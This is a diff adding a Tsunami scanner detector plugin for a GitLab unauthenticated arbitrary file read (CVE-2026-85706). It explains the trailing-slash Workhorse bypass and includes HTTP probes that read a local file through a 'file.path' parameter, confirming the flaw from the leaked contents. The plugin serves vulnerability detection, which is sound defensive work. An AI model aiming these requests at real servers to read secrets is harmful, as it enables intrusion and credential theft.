@@ -1,0 +1,135 @@
+# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "GitLab_CVE_2026_85706"
+  author: "anniemao"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-85706"
+  }
+  severity: CRITICAL
+  title: "GitLab CE/EE Unauthenticated Arbitrary File Read via Repository Commits and Files API Body Upload (CVE-2026-85706)"
+  description: "GitLab CE and EE versions 18.7 through 18.11.11, 19.0 through 19.0.8, 19.1 through 19.1.7, 19.2 through 19.2.5, and 19.3 through 19.3.1 contain an unauthenticated arbitrary file read vulnerability in the Repository Files and Repository Commits REST API endpoints. GitLab Workhorse anchors its requestBodyUploader interception routes (/api/v4/projects/:id/repository/commits and /api/v4/projects/:id/repository/files/:file_path) with \\z while preserving trailing slashes during URI path cleaning. Appending a trailing slash bypasses Workhorse body upload interception and forwards user-controlled parameters to Grape with a valid Gitlab-Workhorse signature header. In lib/api/files.rb and lib/api/commits.rb, file_params_from_body_upload executes prior to authentication and reads attacker-specified local file paths via File.read(params['file.path']) when params['Content-Type'] is set to application/x-www-form-urlencoded, leaking file contents through Rack::QueryParser::InvalidParameterError in HTTP 400 responses."
+  recommendation: "Upgrade GitLab CE/EE to version 18.11.12, 19.0.9, 19.1.8, 19.2.6, 19.3.2, or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-85706"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_gitlab"
+  http_request: {
+    method: GET
+    uri: [
+      "/-/manifest.json",
+      "/users/sign_in",
+      "/explore"
+    ]
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { header: { name: "X-Gitlab-Meta" } contains: "correlation_id" },
+          { body: {} contains: "/-/pwa-icons/" },
+          { body: {} contains: "gon.default_issues_tracker" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "discover_public_project"
+  http_request: {
+    method: GET
+    uri: "/api/v4/projects?per_page=1&simple=true"
+    headers: [
+      { name: "Accept" value: "application/json" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      extract_any: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"id\":([0-9]+)"
+            variable_name: "project_id"
+          },
+          {
+            from_body: {}
+            regexp: "(.*)"
+            variable_name: "projects_fallback"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "probe_repository_file_upload_lfi"
+  http_request: {
+    method: POST
+    uri: [
+      "/api/v4/projects/{{ project_id }}/repository/files/README/?file=&file.path=/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml.example&file.size=1&Content-Type=application/x-www-form-urlencoded",
+      "/api/v4/projects/{{ project_id }}/repository/files/README/?file=&file.path=/srv/gitlab/config/gitlab.yml.example&file.size=1&Content-Type=application/x-www-form-urlencoded",
+      "/api/v4/projects/{{ project_id }}/repository/files/README/?file=&file.path=/home/git/gitlab/config/gitlab.yml.example&file.size=1&Content-Type=application/x-www-form-urlencoded",
+      "/api/v4/projects/{{ project_id }}/repository/commits/?file=&file.path=/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml.example&file.size=1&Content-Type=application/x-www-form-urlencoded",
+      "/api/v4/projects/{{ project_id }}/repository/commits/?file=&file.path=/srv/gitlab/config/gitlab.yml.example&file.size=1&Content-Type=application/x-www-form-urlencoded",
+      "/api/v4/projects/{{ project_id }}/repository/commits/?file=&file.path=/home/git/gitlab/config/gitlab.yml.example&file.size=1&Content-Type=application/x-www-form-urlencoded"
+    ]
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Accept" value: "application/json" }
+    ]
+    data: "file=&file.size=1&Content-Type=application/x-www-form-urlencoded"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 400
+      expect_all: {
+        conditions: [
+          { header: { name: "Content-Type" } contains: "application/json" },
+          { body: {} contains: "400 Bad request - Invalid parameter: invalid %-encoding" },
+          { body: {} contains: "95% of the worker timeout" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "project_id" value: "1" },
+    { name: "projects_fallback" value: "" }
+  ]
+  actions: [
+    "fingerprint_gitlab",
+    "discover_public_project",
+    "probe_repository_file_upload_lfi"
+  ]
+}
